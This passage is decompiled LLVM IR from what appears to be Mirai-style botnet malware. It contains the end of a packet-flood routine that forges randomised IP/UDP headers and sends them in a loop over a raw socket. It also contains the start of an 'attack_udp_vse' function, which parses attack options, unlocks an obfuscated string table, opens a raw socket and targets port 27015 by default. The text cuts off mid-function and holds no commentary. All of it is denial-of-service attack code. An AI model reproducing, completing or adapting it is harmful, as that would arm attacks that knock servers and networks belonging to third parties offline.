  %v5_bb9c = icmp slt i32 %v0_bb8c, %v1_bb8c
  br i1 %v5_bb9c, label %dec_label_pc_bae8, label %dec_label_pc_bba0.preheader.loopexit

dec_label_pc_bba0.preheader.loopexit:             ; preds = %.thread8
  %v0_bba4.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_bba0.preheader

dec_label_pc_bba0.preheader:                      ; preds = %.thread, %dec_label_pc_bba0.preheader.loopexit
  %v0_bba4.pre = phi i32 [ %v0_bba4.pre.pre, %dec_label_pc_bba0.preheader.loopexit ], [ 0, %.thread ]
  %v3_bd0c = icmp eq i32 %v6_b9cc, -1
  %v8_bd0c = icmp eq i32 %v6_b9cc, -1
  %v3_bd24 = icmp eq i32 %v3_ba5c, 65535
  %v2_bd60 = icmp eq i32 %v1_b9b8, 0
  br label %dec_label_pc_bba0

dec_label_pc_bba0:                                ; preds = %dec_label_pc_bba0, %dec_label_pc_bca0, %dec_label_pc_bba0.preheader
  %v0_bba4 = phi i32 [ %v0_bba4.pre, %dec_label_pc_bba0.preheader ], [ 0, %dec_label_pc_bca0 ], [ 0, %dec_label_pc_bba0 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_bba4 = icmp eq i32 %v0_bba4, 0
  store i1 %v2_bba4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bba4, label %dec_label_pc_bba0, label %dec_label_pc_bbb0

dec_label_pc_bbb0:                                ; preds = %dec_label_pc_bba0, %dec_label_pc_bca0
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bbb4

dec_label_pc_bbb4:                                ; preds = %dec_label_pc_bc1c, %dec_label_pc_bbb0
  %v1_bbc8 = phi i32 [ %v1_bc90, %dec_label_pc_bc1c ], [ 0, %dec_label_pc_bbb0 ]
  %v5_bbb8 = mul i32 %v1_bbc8, 24
  %v1_bbbc = load i32, i32* @r8, align 4
  %v2_bbbc = add i32 %v1_bbbc, %v5_bbb8
  store i32 %v2_bbbc, i32* %r3.global-to-local, align 4
  store i32 %v2_b8c4, i32* %r1.global-to-local, align 4
  %v1_bbc4 = add i32 %v2_bbbc, 20
  %v2_bbc4 = inttoptr i32 %v1_bbc4 to i8*
  %v3_bbc4 = load i8, i8* %v2_bbc4, align 1
  %v4_bbc4 = zext i8 %v3_bbc4 to i32
  store i32 %v4_bbc4, i32* %r2.global-to-local, align 4
  %v4_bbc8 = mul i32 %v1_bbc8, 4
  %v5_bbc8 = add i32 %v4_bbc8, %v2_b8c4
  %v6_bbc8 = inttoptr i32 %v5_bbc8 to i32*
  %v7_bbc8 = load i32, i32* %v6_bbc8, align 4
  store i32 %v7_bbc8, i32* @r5, align 4
  %v7_bbcc = icmp eq i8 %v3_bbc4, 31
  store i1 %v7_bbcc, i1* %cpsr_z.global-to-local, align 1
  %v1_bbd0 = add i32 %v7_bbc8, 20
  store i32 %v1_bbd0, i32* @r6, align 4
  %tmp62 = icmp ult i8 %v3_bbc4, 32
  br i1 %tmp62, label %dec_label_pc_bcb4, label %dec_label_pc_bbd8

dec_label_pc_bbd8:                                ; preds = %dec_label_pc_bbb4
  store i32 %v6_b9cc, i32* %r3.global-to-local, align 4
  store i1 %v8_bd0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_bd0c, label %dec_label_pc_bd14, label %dec_label_pc_bbe4

dec_label_pc_bbe4:                                ; preds = %dec_label_pc_bcb4, %dec_label_pc_bbd8
  store i32 %v3_ba5c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_bd24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_bd24, label %dec_label_pc_bd30, label %dec_label_pc_bbf8

dec_label_pc_bbf8:                                ; preds = %dec_label_pc_bd14.dec_label_pc_bbf8_crit_edge, %dec_label_pc_bbe4
  %v1_bbfc = phi i32 [ %v1_bbfc.pre, %dec_label_pc_bd14.dec_label_pc_bbf8_crit_edge ], [ 65535, %dec_label_pc_bbe4 ]
  store i32 %v3_ba3c, i32* %r0.global-to-local, align 4
  %v9_bbfc = icmp eq i32 %v3_ba3c, %v1_bbfc
  store i1 %v9_bbfc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bbfc, label %dec_label_pc_bd44, label %dec_label_pc_bc04

dec_label_pc_bc04:                                ; preds = %dec_label_pc_bd30, %dec_label_pc_bbf8
  %v1_bc08 = phi i32 [ %v1_bd3c, %dec_label_pc_bd30 ], [ %v1_bbfc, %dec_label_pc_bbf8 ]
  store i32 %v3_ba54, i32* %r1.global-to-local, align 4
  %v9_bc08 = icmp eq i32 %v3_ba54, %v1_bc08
  store i1 %v9_bc08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bc08, label %dec_label_pc_bd58, label %dec_label_pc_bc10

dec_label_pc_bc10:                                ; preds = %dec_label_pc_bd44, %dec_label_pc_bc04
  store i32 %v1_b9b8, i32* %r3.global-to-local, align 4
  store i1 %v2_bd60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_bd60, label %dec_label_pc_bc1c, label %dec_label_pc_bd6c

dec_label_pc_bc1c:                                ; preds = %dec_label_pc_bc10, %dec_label_pc_bd58, %dec_label_pc_bd6c
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_bc20 = load i32, i32* @r5, align 4
  %v3_bc20 = add i32 %v2_bc20, 10
  %v4_bc20 = inttoptr i32 %v3_bc20 to i16*
  store i16 0, i16* %v4_bc20, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_bc28 = load i32, i32* @r5, align 4
  store i32 %v0_bc28, i32* @r0, align 4
  %v2_bc2c = call i32 @checksum_generic(i32 %v0_bc28, i32 20)
  %v3_bc2c = trunc i32 %v2_bc2c to i16
  %v3_bc30 = load i32, i32* @r5, align 4
  %v4_bc30 = add i32 %v3_bc30, 10
  %v5_bc30 = inttoptr i32 %v4_bc30 to i16*
  store i16 %v3_bc2c, i16* %v5_bc30, align 2
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_bc38 = load i32, i32* @r6, align 4
  %v3_bc38 = add i32 %v2_bc38, 6
  %v4_bc38 = inttoptr i32 %v3_bc38 to i16*
  store i16 0, i16* %v4_bc38, align 2
  %v0_bc3c = load i32, i32* @r6, align 4
  store i32 %v0_bc3c, i32* @r1, align 4
  %v1_bc40 = add i32 %v0_bc3c, 4
  %v2_bc40 = inttoptr i32 %v1_bc40 to i16*
  %v3_bc40 = load i16, i16* %v2_bc40, align 2
  %v4_bc40 = zext i16 %v3_bc40 to i32
  store i32 %v4_bc40, i32* %r2.global-to-local, align 4
  %v0_bc44 = load i32, i32* @sl, align 4
  store i32 %v0_bc44, i32* %r3.global-to-local, align 4
  %v0_bc48 = load i32, i32* @r5, align 4
  store i32 %v0_bc48, i32* %r0.global-to-local, align 4
  %v4_bc4c = call i32 @checksum_tcpudp(i32 %v0_bc48, i32 %v0_bc3c, i32 %v4_bc40, i32 %v0_bc44)
  %v5_bc4c = trunc i32 %v4_bc4c to i16
  store i32 %v4_bc4c, i32* %r0.global-to-local, align 4
  %v3_bc50 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bc50, i32* %r3.global-to-local, align 4
  %v3_bc54 = mul i32 %v3_bc50, 32
  store i32 %v3_bc54, i32* %lr.global-to-local, align 4
  %v3_bc58 = load i32, i32* @r6, align 4
  %v4_bc58 = add i32 %v3_bc58, 6
  %v5_bc58 = inttoptr i32 %v4_bc58 to i16*
  store i16 %v5_bc4c, i16* %v5_bc58, align 2
  %v0_bc5c = load i32, i32* %lr.global-to-local, align 4
  %v1_bc5c = load i32, i32* %r3.global-to-local, align 4
  %tmp63 = mul i32 %v1_bc5c, -8
  %v5_bc5c = add i32 %v0_bc5c, %tmp63
  store i32 %v5_bc5c, i32* %lr.global-to-local, align 4
  %v0_bc60 = load i32, i32* @r6, align 4
  %v1_bc60 = add i32 %v0_bc60, 2
  %v2_bc60 = inttoptr i32 %v1_bc60 to i16*
  %v3_bc60 = load i16, i16* %v2_bc60, align 2
  %v4_bc60 = zext i16 %v3_bc60 to i32
  store i32 %v4_bc60, i32* @r6, align 4
  %v1_bc64 = load i32, i32* @r8, align 4
  %v2_bc64 = add i32 %v1_bc64, %v5_bc5c
  store i32 %v2_bc64, i32* @lr, align 4
  %v3_bc68 = add i32 %v2_bc64, 2
  %v4_bc68 = inttoptr i32 %v3_bc68 to i16*
  store i16 %v3_bc60, i16* %v4_bc68, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_bc74 = load i32, i32* @r5, align 4
  store i32 %v0_bc74, i32* %r1.global-to-local, align 4
  %v0_bc78 = load i32, i32* @fp, align 4
  store i32 %v0_bc78, i32* %r0.global-to-local, align 4
  %v0_bc7c = load i32, i32* @sb, align 4
  store i32 %v0_bc7c, i32* %r2.global-to-local, align 4
  %v0_bc80 = load i32, i32* @lr, align 4
  %v6_bc88 = call i32 @__libc_sendto(i32 %v0_bc78, i32 %v0_bc74, i32 %v0_bc7c, i32 16384, i32 %v0_bc80, i32 16)
  %v3_bc8c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bc8c, i32* %r3.global-to-local, align 4
  %v1_bc90 = add i32 %v3_bc8c, 1
  store i32 %v1_bc90, i32* %r0.global-to-local, align 4
  %v1_bc94 = load i32, i32* @r7, align 4
  %v9_bc94 = icmp eq i32 %v1_bc90, %v1_bc94
  store i1 %v9_bc94, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_bc90, i32* %stack_var_-44, align 4
  %v5_bc9c = icmp slt i32 %v1_bc90, %v1_bc94
  br i1 %v5_bc9c, label %dec_label_pc_bbb4, label %dec_label_pc_bca0

dec_label_pc_bca0:                                ; preds = %dec_label_pc_bc1c
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_bca4 = icmp eq i32 %v1_bc94, 0
  store i1 %v2_bca4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bca4, label %dec_label_pc_bba0, label %dec_label_pc_bbb0

dec_label_pc_bcb4:                                ; preds = %dec_label_pc_bbb4
  %v1_bcb4 = add i32 %v2_bbbc, 16
  %v2_bcb4 = inttoptr i32 %v1_bcb4 to i32*
  %v3_bcb4 = load i32, i32* %v2_bcb4, align 4
  %v0_bcb8 = call i32 @rand_next()
  store i32 %v0_bcb8, i32* %r0.global-to-local, align 4
  %v3_bcbc = load i32, i32* %stack_var_-44, align 4
  %v5_bcc4 = mul i32 %v3_bcbc, 24
  %v1_bcc8 = and i32 %v3_bcb4, 16711680
  store i32 %v1_bcc8, i32* %ip.global-to-local, align 4
  %v3_bccc = udiv i32 %v3_bcb4, 16777216
  %v4_bcd0 = udiv i32 %v1_bcc8, 256
  %v5_bcd0 = or i32 %v4_bcd0, %v3_bccc
  store i32 %v5_bcd0, i32* %r2.global-to-local, align 4
  %v1_bcd4 = load i32, i32* @r8, align 4
  %v2_bcd4 = add i32 %v1_bcd4, %v5_bcc4
  store i32 %v2_bcd4, i32* %r1.global-to-local, align 4
  %v1_bcd8 = and i32 %v3_bcb4, 65280
  store i32 %v1_bcd8, i32* %r3.global-to-local, align 4
  %v1_bcdc = add i32 %v2_bcd4, 20
  %v2_bcdc = inttoptr i32 %v1_bcdc to i8*
  %v3_bcdc = load i8, i8* %v2_bcdc, align 1
  %v4_bcdc = zext i8 %v3_bcdc to i32
  store i32 %v4_bcdc, i32* %ip.global-to-local, align 4
  %v5_bce4 = call i32 @llvm.bswap.i32(i32 %v3_bcb4)
  %v7_bce8 = lshr i32 %v0_bcb8, %v4_bcdc
  %v8_bce8 = add i32 %v7_bce8, %v5_bce4
  store i32 %v8_bce8, i32* %r2.global-to-local, align 4
  %v1_bcec = and i32 %v8_bce8, 16711680
  store i32 %v1_bcec, i32* %r0.global-to-local, align 4
  %v1_bcf8 = and i32 %v8_bce8, 65280
  store i32 %v1_bcf8, i32* %r1.global-to-local, align 4
  %v5_bd00 = call i32 @llvm.bswap.i32(i32 %v8_bce8)
  %v1_bd04 = load i32, i32* @r5, align 4
  %v2_bd04 = add i32 %v1_bd04, 16
  %v3_bd04 = inttoptr i32 %v2_bd04 to i32*
  store i32 %v5_bd00, i32* %v3_bd04, align 4
  store i32 %v6_b9cc, i32* %r3.global-to-local, align 4
  store i1 %v8_bd0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_bd0c, label %dec_label_pc_bd14, label %dec_label_pc_bbe4

dec_label_pc_bd14:                                ; preds = %dec_label_pc_bcb4, %dec_label_pc_bbd8
  %v0_bd14 = call i32 @rand_next()
  store i32 %v0_bd14, i32* %r0.global-to-local, align 4
  store i32 %v3_ba5c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_bd24, i1* %cpsr_z.global-to-local, align 1
  %v1_bd28 = load i32, i32* @r5, align 4
  %v2_bd28 = add i32 %v1_bd28, 12
  %v3_bd28 = inttoptr i32 %v2_bd28 to i32*
  store i32 %v0_bd14, i32* %v3_bd28, align 4
  br i1 %v3_bd24, label %dec_label_pc_bd30, label %dec_label_pc_bd14.dec_label_pc_bbf8_crit_edge

dec_label_pc_bd14.dec_label_pc_bbf8_crit_edge:    ; preds = %dec_label_pc_bd14
  %v1_bbfc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bbf8

dec_label_pc_bd30:                                ; preds = %dec_label_pc_bd14, %dec_label_pc_bbe4
  %v0_bd30 = call i32 @rand_next()
  %v1_bd30 = trunc i32 %v0_bd30 to i16
  %v3_bd34 = load i32, i32* @r5, align 4
  %v4_bd34 = add i32 %v3_bd34, 4
  %v5_bd34 = inttoptr i32 %v4_bd34 to i16*
  store i16 %v1_bd30, i16* %v5_bd34, align 2
  store i32 %v3_ba3c, i32* %r0.global-to-local, align 4
  %v1_bd3c = load i32, i32* @r4, align 4
  %v9_bd3c = icmp eq i32 %v3_ba3c, %v1_bd3c
  store i1 %v9_bd3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bd3c, label %dec_label_pc_bd44, label %dec_label_pc_bc04

dec_label_pc_bd44:                                ; preds = %dec_label_pc_bd30, %dec_label_pc_bbf8
  %v0_bd44 = call i32 @rand_next()
  %v1_bd44 = trunc i32 %v0_bd44 to i16
  store i32 %v0_bd44, i32* %r0.global-to-local, align 4
  store i32 %v3_ba54, i32* %r1.global-to-local, align 4
  %v1_bd4c = load i32, i32* @r4, align 4
  %v9_bd4c = icmp eq i32 %v3_ba54, %v1_bd4c
  store i1 %v9_bd4c, i1* %cpsr_z.global-to-local, align 1
  %v3_bd50 = load i32, i32* @r5, align 4
  %v4_bd50 = add i32 %v3_bd50, 20
  %v5_bd50 = inttoptr i32 %v4_bd50 to i16*
  store i16 %v1_bd44, i16* %v5_bd50, align 2
  br i1 %v9_bd4c, label %dec_label_pc_bd58, label %dec_label_pc_bc10

dec_label_pc_bd58:                                ; preds = %dec_label_pc_bd44, %dec_label_pc_bc04
  %v0_bd58 = call i32 @rand_next()
  %v1_bd58 = trunc i32 %v0_bd58 to i16
  store i32 %v0_bd58, i32* %r0.global-to-local, align 4
  store i32 %v1_b9b8, i32* %r3.global-to-local, align 4
  store i1 %v2_bd60, i1* %cpsr_z.global-to-local, align 1
  %v3_bd64 = load i32, i32* @r6, align 4
  %v4_bd64 = add i32 %v3_bd64, 2
  %v5_bd64 = inttoptr i32 %v4_bd64 to i16*
  store i16 %v1_bd58, i16* %v5_bd64, align 2
  br i1 %v2_bd60, label %dec_label_pc_bc1c, label %dec_label_pc_bd6c

dec_label_pc_bd6c:                                ; preds = %dec_label_pc_bc10, %dec_label_pc_bd58
  %v0_bd6c = load i32, i32* @r5, align 4
  %v1_bd6c = add i32 %v0_bd6c, 28
  store i32 %v1_bd6c, i32* %r0.global-to-local, align 4
  store i32 %v0_ba84, i32* %r1.global-to-local, align 4
  %v2_bd74 = inttoptr i32 %v1_bd6c to i16*
  %v3_bd74 = call i32 @rand_str(i16* %v2_bd74, i32 %v0_ba84)
  store i32 %v3_bd74, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bc1c

dec_label_pc_bd7c:                                ; preds = %dec_label_pc_b9f0
  %v0_bd7c = load i32, i32* @fp, align 4
  store i32 %v0_bd7c, i32* %r0.global-to-local, align 4
  %v1_bd80 = call i32 @__GI___libc_close(i32 %v0_bd7c)
  store i32 %v1_bd80, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bd84

dec_label_pc_bd84:                                ; preds = %entry, %dec_label_pc_bd7c
  %v1_bd8c = phi i32 [ %v3_b9e0, %entry ], [ %v1_bd80, %dec_label_pc_bd7c ]
  store i32 %v18_b8a8, i32* %sb.global-to-local, align 4
  store i32 %v27_b8a8, i32* %lr.global-to-local, align 4
  ret i32 %v1_bd8c

; uselistorder directives
  uselistorder i32 %v0_bd58, { 1, 0 }
  uselistorder i32 %v0_bd44, { 1, 0 }
  uselistorder i32 %v1_bd3c, { 1, 0 }
  uselistorder i32 %v3_bcb4, { 2, 1, 3, 0 }
  uselistorder i32 %v1_bc90, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_bc5c, { 1, 0 }
  uselistorder i32 %v4_bc4c, { 1, 0 }
  uselistorder i1 %v2_bd60, { 2, 3, 1, 0 }
  uselistorder i1 %v3_bd24, { 3, 2, 0, 1 }
  uselistorder i32 %v3_bad0, { 1, 0 }
  uselistorder i16 %rev, { 1, 0 }
  uselistorder i32 %v3_bab8, { 1, 0 }
  uselistorder i32 %v1_ba88, { 1, 0, 2 }
  uselistorder i32 %v1_ba84, { 1, 0, 2 }
  uselistorder i32 %v3_ba5c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_ba44, { 1, 0, 2, 3 }
  uselistorder i32 %v3_ba3c, { 4, 3, 2, 1, 5, 0 }
  uselistorder i32 %v0_ba34, { 1, 0, 2 }
  uselistorder i32 %v0_ba84, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32 %v3_ba24, { 3, 1, 2, 0 }
  uselistorder i1 %v7_ba10, { 1, 0 }
  uselistorder i1 %v7_b9e4, { 1, 0 }
  uselistorder i32 %v3_b9e0, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_b9cc, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32 %v1_b9b8, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v1_b944, { 1, 2, 0 }
  uselistorder i32 %v1_b920, { 2, 1, 0 }
  uselistorder i32 %v6_b918, { 1, 0 }
  uselistorder i32 %v7_b900, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v6_b8dc, { 2, 1, 3, 0 }
  uselistorder i32 %v2_b8c4, { 0, 3, 1, 2, 4 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 24, 23, 25, 26, 28, 27, 30, 29, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 6, 7, 5, 9, 8, 11, 10, 12, 15, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 34, 30, 31, 32, 33, 35, 37, 36, 38, 39, 40, 41, 42, 43, 44, 45, 46, 0 }
  uselistorder i32 (i16*, i32)* @rand_str, { 0, 1, 2, 10, 3, 4, 5, 6, 9, 7, 8 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_bd84, { 1, 0 }
  uselistorder label %dec_label_pc_bd6c, { 1, 0 }
  uselistorder label %dec_label_pc_bc1c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_bbb0, { 1, 0 }
  uselistorder label %dec_label_pc_bba0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_bba0.preheader, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
}

define i32 @attack_udp_vse(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v3_bd94 = load i32, i32* @r4, align 4
  %v27_bd94 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @sl, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_bdb0 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_bdb4 = load i32, i32* @r5, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_bdb0, i32* @fp, align 4
  %v0_bdc4 = load i32, i32* @r4, align 4
  %v5_bdc8 = inttoptr i32 %v0_bdb4 to i32*
  %v6_bdc8 = call i32 @attack_get_opt_int(i32 %v0_bdc4, i32* %v5_bdc8, i32 2, i32 0, i32 ptrtoint (i32* @0 to i32))
  %v1_bdd4 = urem i32 %v6_bdc8, 256
  store i32 %v1_bdd4, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_bde0 = load i32, i32* @r4, align 4
  %v0_bde4 = load i32, i32* @r5, align 4
  %v5_bde8 = trunc i32 %v6_bdc8 to i8
  %v6_bdec = inttoptr i32 %v0_bde4 to i32*
  %v7_bdec = call i32 @attack_get_opt_int(i32 %v0_bde0, i32* %v6_bdec, i32 3, i32 65535, i32 %v6_bdc8)
  %v0_bdf0 = load i32, i32* @r5, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_bdec, i32* @r7, align 4
  %v0_be00 = load i32, i32* @r4, align 4
  %v5_be04 = inttoptr i32 %v0_bdf0 to i32*
  %v6_be04 = call i32 @attack_get_opt_int(i32 %v0_be00, i32* %v5_be04, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_be0c = urem i32 %v6_be04, 256
  store i32 %v1_be0c, i32* %ip.global-to-local, align 4
  %v0_be10 = load i32, i32* @r5, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_be1c = load i32, i32* @r4, align 4
  %sext = mul i32 %v6_be04, 16777216
  %v5_be24 = sdiv i32 %sext, 16777216
  %v6_be24 = inttoptr i32 %v0_be10 to i32*
  %v7_be24 = call i32 @attack_get_opt_int(i32 %v0_be1c, i32* %v6_be24, i32 5, i32 0, i32 %v5_be24)
  %v1_be30 = urem i32 %v7_be24, 256
  store i32 %v1_be30, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_be3c = load i32, i32* @r4, align 4
  %v0_be40 = load i32, i32* @r5, align 4
  %v5_be48 = inttoptr i32 %v0_be40 to i32*
  %v6_be48 = call i32 @attack_get_opt_int(i32 %v0_be3c, i32* %v5_be48, i32 6, i32 65535, i32 %v1_be30)
  store i32 27015, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_be58 = load i32, i32* @r5, align 4
  store i32 %v6_be48, i32* @r6, align 4
  %v0_be60 = load i32, i32* @r4, align 4
  %v5_be64 = inttoptr i32 %v0_be58 to i32*
  %v6_be64 = call i32 @attack_get_opt_int(i32 %v0_be60, i32* %v5_be64, i32 7, i32 27015, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_be64, i32* @r4, align 4
  %v1_be70 = call i32 @table_unlock_val(i32 23)
  %v3_be7c = call i32 @table_retrieve_val(i32 23, i32* nonnull %stack_var_-48)
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_be90 = call i32 @socket(i32 2, i32 3, i32 17)
  %v7_be94 = icmp eq i32 %v3_be90, -1
  store i1 %v7_be94, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_be90, i32* @sb, align 4
  br i1 %v7_be94, label %dec_label_pc_c1bc, label %dec_label_pc_bea0

dec_label_pc_bea0:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_bea8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_bea8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_bebc = call i32 @__GI_setsockopt(i32 %v3_be90, i32 0, i32 3, i32 %v6_bea8, i32 ptrtoint (i32* @0 to i32))
  %v7_bec0 = icmp eq i32 %v5_bebc, -1
  store i1 %v7_bec0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bec0, label %dec_label_pc_c1b4, label %dec_label_pc_bec8

dec_label_pc_bec8:                                ; preds = %dec_label_pc_bea0
  %v0_bec8 = load i32, i32* @r4, align 4
  %v3_bec8 = mul i32 %v0_bec8, 65536
  store i32 %v3_bec8, i32* @lr, align 4
  %v0_becc = load i32, i32* @r7, align 4
  %v0_bed0 = load i32, i32* @r6, align 4
  %v3_bed0 = mul i32 %v0_bed0, 65536
  store i32 %v3_bed0, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_bed8 = urem i32 %v0_becc, 65536
  %v3_bedc = urem i32 %v0_bed0, 65536
  store i32 %v3_bedc, i32* %r2.global-to-local, align 4
  %v3_bee0 = urem i32 %v0_bec8, 65536
  store i32 %v3_bee0, i32* %r3.global-to-local, align 4
  %v0_bee4 = load i32, i32* @r8, align 4
  %v2_bee4 = icmp eq i32 %v0_bee4, 0
  store i1 %v2_bee4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bee4, label %dec_label_pc_c020.preheader, label %dec_label_pc_befc

dec_label_pc_befc:                                ; preds = %dec_label_pc_bec8
  %tmp33 = mul i32 %v0_becc, 256
  %v3_bf0c = and i32 %tmp33, 65280
  store i32 %v3_bf0c, i32* %r3.global-to-local, align 4
  %tmp34 = mul i32 %v0_bed0, 256
  %v3_bf10 = and i32 %tmp34, 65280
  store i32 %v3_bf10, i32* %r2.global-to-local, align 4
  %tmp35 = mul i32 %v0_bec8, 256
  %v3_bf14 = and i32 %tmp35, 65280
  %tmp36 = udiv i32 %v0_becc, 256
  %v4_bf18 = urem i32 %tmp36, 256
  %v5_bf18 = or i32 %v4_bf18, %v3_bf0c
  store i32 %v5_bf18, i32* @r5, align 4
  %tmp37 = udiv i32 %v0_bed0, 256
  %v4_bf1c = urem i32 %tmp37, 256
  %v5_bf1c = or i32 %v4_bf1c, %v3_bf10
  store i32 %v5_bf1c, i32* @r6, align 4
  %tmp38 = udiv i32 %v0_bec8, 256
  %v4_bf20 = urem i32 %tmp38, 256
  %v5_bf20 = or i32 %v4_bf20, %v3_bf14
  store i32 %v5_bf20, i32* @r7, align 4
  %v1_bfa8 = trunc i32 %v5_be24 to i8
  br label %dec_label_pc_bf24

dec_label_pc_bf24:                                ; preds = %.thread, %dec_label_pc_befc
  %v2_bf2c = call i32 @calloc(i32 128, i32 1)
  %v3_bf30 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bf30, i32* %r2.global-to-local, align 4
  %v5_bf38 = mul i32 %v3_bf30, 24
  store i32 %v5_bf38, i32* %r3.global-to-local, align 4
  %v1_bf3c = load i32, i32* @fp, align 4
  %v2_bf3c = load i32, i32* @r4, align 4
  %v5_bf3c = mul i32 %v2_bf3c, 4
  %v6_bf3c = add i32 %v5_bf3c, %v1_bf3c
  %v7_bf3c = inttoptr i32 %v6_bf3c to i32*
  store i32 %v2_bf2c, i32* %v7_bf3c, align 4
  %v0_bf40 = load i32, i32* %r3.global-to-local, align 4
  %v1_bf40 = load i32, i32* @sl, align 4
  %v2_bf40 = add i32 %v1_bf40, %v0_bf40
  store i32 %v2_bf40, i32* %r3.global-to-local, align 4
  %v0_bf44 = load i32, i32* @fp, align 4
  %v1_bf44 = load i32, i32* %r2.global-to-local, align 4
  %v4_bf44 = mul i32 %v1_bf44, 4
  %v5_bf44 = add i32 %v4_bf44, %v0_bf44
  %v6_bf44 = inttoptr i32 %v5_bf44 to i32*
  %v7_bf44 = load i32, i32* %v6_bf44, align 4
  store i32 %v7_bf44, i32* @lr, align 4
  %v1_bf4c = inttoptr i32 %v7_bf44 to i8*
  %v2_bf4c = load i8, i8* %v1_bf4c, align 1
  %tmp = urem i8 %v2_bf4c, 16
  %v1_bf50 = zext i8 %tmp to i32
  %v1_bf54 = or i32 %v1_bf50, 64
  store i32 %v1_bf54, i32* %r3.global-to-local, align 4
  %v1_bf5c = trunc i32 %v1_bf54 to i8
  store i8 %v1_bf5c, i8* %v1_bf4c, align 1
  %v0_bf60 = load i32, i32* @lr, align 4
